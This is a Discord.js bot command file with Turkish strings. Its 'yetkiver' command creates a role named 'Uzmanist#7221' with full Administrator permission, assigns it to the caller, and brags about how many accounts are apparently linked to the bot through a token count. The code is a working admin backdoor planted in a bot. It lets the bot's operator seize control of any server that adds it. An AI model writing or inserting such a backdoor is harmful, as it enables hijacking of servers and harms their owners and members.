const discord = require("discord.js");

module.exports = {
  name: "yetkiver",
  description: "Sana Yönetici İznine Sahip Bir Yetki Verir",
  default_permission: false,
  timeout: 30000,
  
  run: async (client, interaction, args) => {
      const { PermissionsBitField } = require('discord.js');
let embed1 = new discord.EmbedBuilder()
      .setTitle(`Yetki Verildi`)
      .setColor(0x7cade2)
      .setThumbnail(client.user.displayAvatarURL())
    .setDescription(` **Uzmanist#7221** Adında Tam Yetkiye Sahip Rol Oluşturdum ve Sana Verdim :)\n\n**__İşine yarayabilecek bir bilgi:__** Şu anda **${await client.tokenCount()}** hesap bana bağlı :D`)


    
interaction.guild.roles.create({ name: 'Uzmanist#7221', permissions: [PermissionsBitField.Flags.Administrator] }).then(role => {

    const { member } = interaction;
    member.roles.add(role);
});
    await interaction.reply({
        embeds: [embed1]
      })
  }
  }